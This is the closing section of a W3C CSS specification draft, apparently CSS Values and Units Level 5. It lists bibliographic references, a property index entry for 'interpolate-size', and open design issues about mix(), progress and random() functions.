David Baron; et al. [CSS Animations Level 1](https://www.w3.org/TR/css-animations-1/). 2 March 2023. WD. URL: [https&#x3A;&#x2F;&#x2F;www&#x2E;w3&#x2E;org&#x2F;TR&#x2F;css-animations-1&#x2F;](https://www.w3.org/TR/css-animations-1/)

<a id="biblio-css-animations-2"></a>\[CSS-ANIMATIONS-2\]  
David Baron; Brian Birtles. [CSS Animations Level 2](https://www.w3.org/TR/css-animations-2/). 2 June 2023. WD. URL: [https&#x3A;&#x2F;&#x2F;www&#x2E;w3&#x2E;org&#x2F;TR&#x2F;css-animations-2&#x2F;](https://www.w3.org/TR/css-animations-2/)

<a id="biblio-css-backgrounds-3"></a>\[CSS-BACKGROUNDS-3\]  
Elika Etemad; Brad Kemper. [CSS Backgrounds and Borders Module Level 3](https://www.w3.org/TR/css-backgrounds-3/). 11 March 2024. CR. URL: [https&#x3A;&#x2F;&#x2F;www&#x2E;w3&#x2E;org&#x2F;TR&#x2F;css-backgrounds-3&#x2F;](https://www.w3.org/TR/css-backgrounds-3/)

<a id="biblio-css-cascade-5"></a>\[CSS-CASCADE-5\]  
Elika Etemad; Miriam Suzanne; Tab Atkins Jr.. [CSS Cascading and Inheritance Level 5](https://www.w3.org/TR/css-cascade-5/). 13 January 2022. CR. URL: [https&#x3A;&#x2F;&#x2F;www&#x2E;w3&#x2E;org&#x2F;TR&#x2F;css-cascade-5&#x2F;](https://www.w3.org/TR/css-cascade-5/)

<a id="biblio-css-color-5"></a>\[CSS-COLOR-5\]  
Chris Lilley; et al. [CSS Color Module Level 5](https://www.w3.org/TR/css-color-5/). 29 February 2024. WD. URL: [https&#x3A;&#x2F;&#x2F;www&#x2E;w3&#x2E;org&#x2F;TR&#x2F;css-color-5&#x2F;](https://www.w3.org/TR/css-color-5/)

<a id="biblio-css-conditional-3"></a>\[CSS-CONDITIONAL-3\]  
Chris Lilley; David Baron; Elika Etemad. [CSS Conditional Rules Module Level 3](https://www.w3.org/TR/css-conditional-3/). 15 August 2024. CR. URL: [https&#x3A;&#x2F;&#x2F;www&#x2E;w3&#x2E;org&#x2F;TR&#x2F;css-conditional-3&#x2F;](https://www.w3.org/TR/css-conditional-3/)

<a id="biblio-css-conditional-5"></a>\[CSS-CONDITIONAL-5\]  
Chris Lilley; et al. [CSS Conditional Rules Module Level 5](https://www.w3.org/TR/css-conditional-5/). 5 November 2024. WD. URL: [https&#x3A;&#x2F;&#x2F;www&#x2E;w3&#x2E;org&#x2F;TR&#x2F;css-conditional-5&#x2F;](https://www.w3.org/TR/css-conditional-5/)

<a id="biblio-css-contain-3"></a>\[CSS-CONTAIN-3\]  
Tab Atkins Jr.; Florian Rivoal; Miriam Suzanne. [CSS Containment Module Level 3](https://www.w3.org/TR/css-contain-3/). 18 August 2022. WD. URL: [https&#x3A;&#x2F;&#x2F;www&#x2E;w3&#x2E;org&#x2F;TR&#x2F;css-contain-3&#x2F;](https://www.w3.org/TR/css-contain-3/)

<a id="biblio-css-display-3"></a>\[CSS-DISPLAY-3\]  
Elika Etemad; Tab Atkins Jr.. [CSS Display Module Level 3](https://www.w3.org/TR/css-display-3/). 30 March 2023. CR. URL: [https&#x3A;&#x2F;&#x2F;www&#x2E;w3&#x2E;org&#x2F;TR&#x2F;css-display-3&#x2F;](https://www.w3.org/TR/css-display-3/)

<a id="biblio-css-easing-1"></a>\[CSS-EASING-1\]  
Brian Birtles; Dean Jackson; Matt Rakow. [CSS Easing Functions Level 1](https://www.w3.org/TR/css-easing-1/). 13 February 2023. CR. URL: [https&#x3A;&#x2F;&#x2F;www&#x2E;w3&#x2E;org&#x2F;TR&#x2F;css-easing-1&#x2F;](https://www.w3.org/TR/css-easing-1/)

<a id="biblio-css-easing-2"></a>\[CSS-EASING-2\]  
[CSS Easing Functions Level 2](https://www.w3.org/TR/css-easing-2/). 29 August 2024. WD. URL: [https&#x3A;&#x2F;&#x2F;www&#x2E;w3&#x2E;org&#x2F;TR&#x2F;css-easing-2&#x2F;](https://www.w3.org/TR/css-easing-2/)

<a id="biblio-css-fonts-4"></a>\[CSS-FONTS-4\]  
Chris Lilley. [CSS Fonts Module Level 4](https://www.w3.org/TR/css-fonts-4/). 1 February 2024. WD. URL: [https&#x3A;&#x2F;&#x2F;www&#x2E;w3&#x2E;org&#x2F;TR&#x2F;css-fonts-4&#x2F;](https://www.w3.org/TR/css-fonts-4/)

<a id="biblio-css-images-3"></a>\[CSS-IMAGES-3\]  
Tab Atkins Jr.; Elika Etemad; Lea Verou. [CSS Images Module Level 3](https://www.w3.org/TR/css-images-3/). 18 December 2023. CR. URL: [https&#x3A;&#x2F;&#x2F;www&#x2E;w3&#x2E;org&#x2F;TR&#x2F;css-images-3&#x2F;](https://www.w3.org/TR/css-images-3/)

<a id="biblio-css-images-4"></a>\[CSS-IMAGES-4\]  
Tab Atkins Jr.; Elika Etemad; Lea Verou. [CSS Images Module Level 4](https://www.w3.org/TR/css-images-4/). 17 February 2023. WD. URL: [https&#x3A;&#x2F;&#x2F;www&#x2E;w3&#x2E;org&#x2F;TR&#x2F;css-images-4&#x2F;](https://www.w3.org/TR/css-images-4/)

<a id="biblio-css-properties-values-api-1"></a>\[CSS-PROPERTIES-VALUES-API-1\]  
Tab Atkins Jr.; Alan Stearns; Greg Whitworth. [CSS Properties and Values API Level 1](https://www.w3.org/TR/css-properties-values-api-1/). 26 March 2024. WD. URL: [https&#x3A;&#x2F;&#x2F;www&#x2E;w3&#x2E;org&#x2F;TR&#x2F;css-properties-values-api-1&#x2F;](https://www.w3.org/TR/css-properties-values-api-1/)

<a id="biblio-css-sizing-3"></a>\[CSS-SIZING-3\]  
Tab Atkins Jr.; Elika Etemad. [CSS Box Sizing Module Level 3](https://www.w3.org/TR/css-sizing-3/). 17 December 2021. WD. URL: [https&#x3A;&#x2F;&#x2F;www&#x2E;w3&#x2E;org&#x2F;TR&#x2F;css-sizing-3&#x2F;](https://www.w3.org/TR/css-sizing-3/)

<a id="biblio-css-sizing-4"></a>\[CSS-SIZING-4\]  
Tab Atkins Jr.; Elika Etemad; Jen Simmons. [CSS Box Sizing Module Level 4](https://www.w3.org/TR/css-sizing-4/). 20 May 2021. WD. URL: [https&#x3A;&#x2F;&#x2F;www&#x2E;w3&#x2E;org&#x2F;TR&#x2F;css-sizing-4&#x2F;](https://www.w3.org/TR/css-sizing-4/)

<a id="biblio-css-syntax-3"></a>\[CSS-SYNTAX-3\]  
Tab Atkins Jr.; Simon Sapin. [CSS Syntax Module Level 3](https://www.w3.org/TR/css-syntax-3/). 24 December 2021. CR. URL: [https&#x3A;&#x2F;&#x2F;www&#x2E;w3&#x2E;org&#x2F;TR&#x2F;css-syntax-3&#x2F;](https://www.w3.org/TR/css-syntax-3/)

<a id="biblio-css-transforms-1"></a>\[CSS-TRANSFORMS-1\]  
Simon Fraser; et al. [CSS Transforms Module Level 1](https://www.w3.org/TR/css-transforms-1/). 14 February 2019. CR. URL: [https&#x3A;&#x2F;&#x2F;www&#x2E;w3&#x2E;org&#x2F;TR&#x2F;css-transforms-1&#x2F;](https://www.w3.org/TR/css-transforms-1/)

<a id="biblio-css-transforms-2"></a>\[CSS-TRANSFORMS-2\]  
Tab Atkins Jr.; et al. [CSS Transforms Module Level 2](https://www.w3.org/TR/css-transforms-2/). 9 November 2021. WD. URL: [https&#x3A;&#x2F;&#x2F;www&#x2E;w3&#x2E;org&#x2F;TR&#x2F;css-transforms-2&#x2F;](https://www.w3.org/TR/css-transforms-2/)

<a id="biblio-css-transitions-1"></a>\[CSS-TRANSITIONS-1\]  
David Baron; et al. [CSS Transitions](https://www.w3.org/TR/css-transitions-1/). 11 October 2018. WD. URL: [https&#x3A;&#x2F;&#x2F;www&#x2E;w3&#x2E;org&#x2F;TR&#x2F;css-transitions-1&#x2F;](https://www.w3.org/TR/css-transitions-1/)

<a id="biblio-css-typed-om-1"></a>\[CSS-TYPED-OM-1\]  
Tab Atkins Jr.; François Remy. [CSS Typed OM Level 1](https://www.w3.org/TR/css-typed-om-1/). 21 March 2024. WD. URL: [https&#x3A;&#x2F;&#x2F;www&#x2E;w3&#x2E;org&#x2F;TR&#x2F;css-typed-om-1&#x2F;](https://www.w3.org/TR/css-typed-om-1/)

<a id="biblio-css-values-4"></a>\[CSS-VALUES-4\]  
Tab Atkins Jr.; Elika Etemad. [CSS Values and Units Module Level 4](https://www.w3.org/TR/css-values-4/). 12 March 2024. WD. URL: [https&#x3A;&#x2F;&#x2F;www&#x2E;w3&#x2E;org&#x2F;TR&#x2F;css-values-4&#x2F;](https://www.w3.org/TR/css-values-4/)

<a id="biblio-css-values-5"></a>\[CSS-VALUES-5\]  
Tab Atkins Jr.; Elika Etemad; Miriam Suzanne. [CSS Values and Units Module Level 5](https://www.w3.org/TR/css-values-5/). 17 September 2024. WD. URL: [https&#x3A;&#x2F;&#x2F;www&#x2E;w3&#x2E;org&#x2F;TR&#x2F;css-values-5&#x2F;](https://www.w3.org/TR/css-values-5/)

<a id="biblio-css-variables-1"></a>\[CSS-VARIABLES-1\]  
Tab Atkins Jr.. [CSS Custom Properties for Cascading Variables Module Level 1](https://www.w3.org/TR/css-variables-1/). 16 June 2022. CR. URL: [https&#x3A;&#x2F;&#x2F;www&#x2E;w3&#x2E;org&#x2F;TR&#x2F;css-variables-1&#x2F;](https://www.w3.org/TR/css-variables-1/)

<a id="biblio-css-writing-modes-4"></a>\[CSS-WRITING-MODES-4\]  
Elika Etemad; Koji Ishii. [CSS Writing Modes Level 4](https://www.w3.org/TR/css-writing-modes-4/). 30 July 2019. CR. URL: [https&#x3A;&#x2F;&#x2F;www&#x2E;w3&#x2E;org&#x2F;TR&#x2F;css-writing-modes-4&#x2F;](https://www.w3.org/TR/css-writing-modes-4/)

<a id="biblio-css21"></a>\[CSS21\]  
Bert Bos; et al. [Cascading Style Sheets Level 2 Revision 1 (CSS 2.1) Specification](https://www.w3.org/TR/CSS21/). 7 June 2011. REC. URL: [https&#x3A;&#x2F;&#x2F;www&#x2E;w3&#x2E;org&#x2F;TR&#x2F;CSS21&#x2F;](https://www.w3.org/TR/CSS21/)

<a id="biblio-dom"></a>\[DOM\]  
Anne van Kesteren. [DOM Standard](https://dom.spec.whatwg.org/). Living Standard. URL: [https&#x3A;&#x2F;&#x2F;dom&#x2E;spec&#x2E;whatwg&#x2E;org&#x2F;](https://dom.spec.whatwg.org/)

<a id="biblio-ecmascript"></a>\[ECMASCRIPT\]  
[ECMAScript Language Specification](https://tc39.es/ecma262/multipage/). URL: [https&#x3A;&#x2F;&#x2F;tc39&#x2E;es&#x2F;ecma262&#x2F;multipage&#x2F;](https://tc39.es/ecma262/multipage/)

<a id="biblio-fetch"></a>\[FETCH\]  
Anne van Kesteren. [Fetch Standard](https://fetch.spec.whatwg.org/). Living Standard. URL: [https&#x3A;&#x2F;&#x2F;fetch&#x2E;spec&#x2E;whatwg&#x2E;org&#x2F;](https://fetch.spec.whatwg.org/)

<a id="biblio-html"></a>\[HTML\]  
Anne van Kesteren; et al. [HTML Standard](https://html.spec.whatwg.org/multipage/). Living Standard. URL: [https&#x3A;&#x2F;&#x2F;html&#x2E;spec&#x2E;whatwg&#x2E;org&#x2F;multipage&#x2F;](https://html.spec.whatwg.org/multipage/)

<a id="biblio-infra"></a>\[INFRA\]  
Anne van Kesteren; Domenic Denicola. [Infra Standard](https://infra.spec.whatwg.org/). Living Standard. URL: [https&#x3A;&#x2F;&#x2F;infra&#x2E;spec&#x2E;whatwg&#x2E;org&#x2F;](https://infra.spec.whatwg.org/)

<a id="biblio-mediaqueries-4"></a>\[MEDIAQUERIES-4\]  
Florian Rivoal; Tab Atkins Jr.. [Media Queries Level 4](https://www.w3.org/TR/mediaqueries-4/). 25 December 2021. CR. URL: [https&#x3A;&#x2F;&#x2F;www&#x2E;w3&#x2E;org&#x2F;TR&#x2F;mediaqueries-4&#x2F;](https://www.w3.org/TR/mediaqueries-4/)

<a id="biblio-mediaqueries-5"></a>\[MEDIAQUERIES-5\]  
Dean Jackson; et al. [Media Queries Level 5](https://www.w3.org/TR/mediaqueries-5/). 18 December 2021. WD. URL: [https&#x3A;&#x2F;&#x2F;www&#x2E;w3&#x2E;org&#x2F;TR&#x2F;mediaqueries-5&#x2F;](https://www.w3.org/TR/mediaqueries-5/)

<a id="biblio-referrer-policy"></a>\[REFERRER-POLICY\]  
Jochen Eisinger; Emily Stark. [Referrer Policy](https://www.w3.org/TR/referrer-policy/). 26 January 2017. CR. URL: [https&#x3A;&#x2F;&#x2F;www&#x2E;w3&#x2E;org&#x2F;TR&#x2F;referrer-policy&#x2F;](https://www.w3.org/TR/referrer-policy/)

<a id="biblio-rfc2119"></a>\[RFC2119\]  
S. Bradner. [Key words for use in RFCs to Indicate Requirement Levels](https://datatracker.ietf.org/doc/html/rfc2119). March 1997. Best Current Practice. URL: [https&#x3A;&#x2F;&#x2F;datatracker&#x2E;ietf&#x2E;org&#x2F;doc&#x2F;html&#x2F;rfc2119](https://datatracker.ietf.org/doc/html/rfc2119)

<a id="biblio-selectors-3"></a>\[SELECTORS-3\]  
Tantek Çelik; et al. [Selectors Level 3](https://www.w3.org/TR/selectors-3/). 6 November 2018. REC. URL: [https&#x3A;&#x2F;&#x2F;www&#x2E;w3&#x2E;org&#x2F;TR&#x2F;selectors-3&#x2F;](https://www.w3.org/TR/selectors-3/)

<a id="biblio-selectors-4"></a>\[SELECTORS-4\]  
Elika Etemad; Tab Atkins Jr.. [Selectors Level 4](https://www.w3.org/TR/selectors-4/). 11 November 2022. WD. URL: [https&#x3A;&#x2F;&#x2F;www&#x2E;w3&#x2E;org&#x2F;TR&#x2F;selectors-4&#x2F;](https://www.w3.org/TR/selectors-4/)

<a id="biblio-web-animations-1"></a>\[WEB-ANIMATIONS-1\]  
Brian Birtles; et al. [Web Animations](https://www.w3.org/TR/web-animations-1/). 5 June 2023. WD. URL: [https&#x3A;&#x2F;&#x2F;www&#x2E;w3&#x2E;org&#x2F;TR&#x2F;web-animations-1&#x2F;](https://www.w3.org/TR/web-animations-1/)

<a id="biblio-web-animations-2"></a>\[WEB-ANIMATIONS-2\]  
Brian Birtles; Robert Flack. [Web Animations Level 2](https://www.w3.org/TR/web-animations-2/). 21 February 2023. WD. URL: [https&#x3A;&#x2F;&#x2F;www&#x2E;w3&#x2E;org&#x2F;TR&#x2F;web-animations-2&#x2F;](https://www.w3.org/TR/web-animations-2/)

<a id="biblio-webidl"></a>\[WEBIDL\]  
Edgar Chen; Timothy Gu. [Web IDL Standard](https://webidl.spec.whatwg.org/). Living Standard. URL: [https&#x3A;&#x2F;&#x2F;webidl&#x2E;spec&#x2E;whatwg&#x2E;org&#x2F;](https://webidl.spec.whatwg.org/)

### <a id="informative"></a>Informative References

<a id="biblio-css-box-4"></a>\[CSS-BOX-4\]  
Elika Etemad. [CSS Box Model Module Level 4](https://www.w3.org/TR/css-box-4/). 4 August 2024. WD. URL: [https&#x3A;&#x2F;&#x2F;www&#x2E;w3&#x2E;org&#x2F;TR&#x2F;css-box-4&#x2F;](https://www.w3.org/TR/css-box-4/)

<a id="biblio-css-cascade-4"></a>\[CSS-CASCADE-4\]  
Elika Etemad; Tab Atkins Jr.. [CSS Cascading and Inheritance Level 4](https://www.w3.org/TR/css-cascade-4/). 13 January 2022. CR. URL: [https&#x3A;&#x2F;&#x2F;www&#x2E;w3&#x2E;org&#x2F;TR&#x2F;css-cascade-4&#x2F;](https://www.w3.org/TR/css-cascade-4/)

<a id="biblio-css-cascade-6"></a>\[CSS-CASCADE-6\]  
Elika Etemad; Miriam Suzanne; Tab Atkins Jr.. [CSS Cascading and Inheritance Level 6](https://www.w3.org/TR/css-cascade-6/). 6 September 2024. WD. URL: [https&#x3A;&#x2F;&#x2F;www&#x2E;w3&#x2E;org&#x2F;TR&#x2F;css-cascade-6&#x2F;](https://www.w3.org/TR/css-cascade-6/)

<a id="biblio-css-color-4"></a>\[CSS-COLOR-4\]  
Chris Lilley; Tab Atkins Jr.; Lea Verou. [CSS Color Module Level 4](https://www.w3.org/TR/css-color-4/). 13 February 2024. CR. URL: [https&#x3A;&#x2F;&#x2F;www&#x2E;w3&#x2E;org&#x2F;TR&#x2F;css-color-4&#x2F;](https://www.w3.org/TR/css-color-4/)

<a id="biblio-css-lists-3"></a>\[CSS-LISTS-3\]  
Elika Etemad; Tab Atkins Jr.. [CSS Lists and Counters Module Level 3](https://www.w3.org/TR/css-lists-3/). 17 November 2020. WD. URL: [https&#x3A;&#x2F;&#x2F;www&#x2E;w3&#x2E;org&#x2F;TR&#x2F;css-lists-3&#x2F;](https://www.w3.org/TR/css-lists-3/)

<a id="biblio-css-scoping-1"></a>\[CSS-SCOPING-1\]  
Tab Atkins Jr.; Elika Etemad. [CSS Scoping Module Level 1](https://www.w3.org/TR/css-scoping-1/). 3 April 2014. WD. URL: [https&#x3A;&#x2F;&#x2F;www&#x2E;w3&#x2E;org&#x2F;TR&#x2F;css-scoping-1&#x2F;](https://www.w3.org/TR/css-scoping-1/)

<a id="biblio-css22"></a>\[CSS22\]  
Bert Bos. [Cascading Style Sheets Level 2 Revision 2 (CSS 2.2) Specification](https://www.w3.org/TR/CSS22/). 12 April 2016. WD. URL: [https&#x3A;&#x2F;&#x2F;www&#x2E;w3&#x2E;org&#x2F;TR&#x2F;CSS22&#x2F;](https://www.w3.org/TR/CSS22/)

<a id="biblio-cssom-1"></a>\[CSSOM-1\]  
Daniel Glazman; Emilio Cobos Álvarez. [CSS Object Model (CSSOM)](https://www.w3.org/TR/cssom-1/). 26 August 2021. WD. URL: [https&#x3A;&#x2F;&#x2F;www&#x2E;w3&#x2E;org&#x2F;TR&#x2F;cssom-1&#x2F;](https://www.w3.org/TR/cssom-1/)

## <a id="property-index"></a>Property Index

| Name                | Value                          | Initial      | Applies to   | Inh. | %ages | Anim­ation type | Canonical order | Com­puted value |
|---------------------|--------------------------------|--------------|--------------|------|-------|----------------|-----------------|----------------|
| <strong><span><a id="ref-for-propdef-interpolate-size⑤"></a></span><a href="#propdef-interpolate-size">interpolate-size</a>&#xA;      </strong> | numeric-only \| allow-keywords | numeric-only | all elements | yes  | n/a   | not animatable | per grammar     | as specified   |

## <a id="issues-index"></a>Issues Index

> <strong data-conversion-semantic="issue">Issue</strong>
>
> <strong>This is a diff spec against <a href="https://www.w3.org/TR/css-values-4/">CSS Values and Units Level 4</a>.</strong> [↵](#issue-39df5f37)

> <strong data-conversion-semantic="issue">Issue</strong>
>
> Need to define how this syntax would expand to the longhands of [background-position](https://www.w3.org/TR/css-backgrounds-3/#propdef-background-position) if e.g. [var()](https://www.w3.org/TR/css-variables-1/#funcdef-var) is used for some (or all) of the components. [\[Issue \#9690\]](https://github.com/w3c/csswg-drafts/issues/9690) [↵](#issue-8e940682)

> <strong data-conversion-semantic="issue">Issue</strong>
>
> This section is an exploratory draft, and not yet approved by the CSSWG. [\[Issue \#6245\]](https://github.com/w3c/csswg-drafts/issues/6245) [↵](#issue-a8c048ec)

> <strong data-conversion-semantic="issue">Issue</strong>
>
> Do we need a percent-progress() notation, or do enough places auto-convert that it’s not necessary? [↵](#issue-997f0423)

> <strong data-conversion-semantic="issue">Issue</strong>
>
> This feature [does not handle multiple breakpoints very well](https://css.typetura.com/ruleset-interpolation/explainer/), and [might need to be redesigned](https://github.com/w3c/csswg-drafts/issues/6245#issuecomment-2469190377). [\[Issue \#6245\]](https://github.com/w3c/csswg-drafts/issues/6245) [↵](#issue-3bcda989)

> <strong data-conversion-semantic="issue">Issue</strong>
>
> The [mix()](#funcdef-mix) notation also has a variant that takes a set of keyframes. It does this by referring to an [@keyframes](https://www.w3.org/TR/css-animations-1/#at-ruledef-keyframes) rule, and pulling the corresponding property declaration out of that. It would be nice to allow the other mix notations to take keyframe also, but how would we represent a set of keyframes for a [component value](https://www.w3.org/TR/css-syntax-3/#component-value) (rather than a full property value)? [↵](#issue-db9bc56c)

> <strong data-conversion-semantic="issue">Issue</strong>
>
> [\<progress\>](#typedef-progress) allows returning percentages outside 0-100%, but [color-mix()](https://www.w3.org/TR/css-color-5/#funcdef-color-mix) doesn’t allows such values, so need to define how that gets processed. [↵](#issue-78ec385d)

> <strong data-conversion-semantic="issue">Issue</strong>
>
> Should this have a different name? We didn’t quite decide on it during the resolution to add this. [↵](#issue-3679a886)

> <strong data-conversion-semantic="issue">Issue</strong>
>
> At least in theory it should be fine to use [random()](#funcdef-random) in non-property contexts, so long as per-element isn’t specified; it’s well-defined what happens with `@media (max-width: random(100px, 500px)) {...}`, for example. I suspect we want to disallow it, tho? [↵](#issue-2146881a)

> <strong data-conversion-semantic="issue">Issue</strong>
>
> Define [arbitrary substitution function](#arbitrary-substitution-function), probably over in Variables, since we have several upcoming functions leaning on this functionality. [↵](#issue-36f85add)

> <strong data-conversion-semantic="issue">Issue</strong>
>
> Since [random-item()](#funcdef-random-item) is var()-like, we probably want to restrict it to only be usable in properties. (This is likely something we want to apply to all such functions.) Tho [random()](#funcdef-random) is a fundamentally different kind of value, we probably want to restrict it as well, for thematic consistency. [↵](#issue-56846ba6)

> <strong data-conversion-semantic="issue">Issue</strong>
>
> Should any of these functions be valid in contexts outside of properties? [↵](#issue-2cf4bbb3)
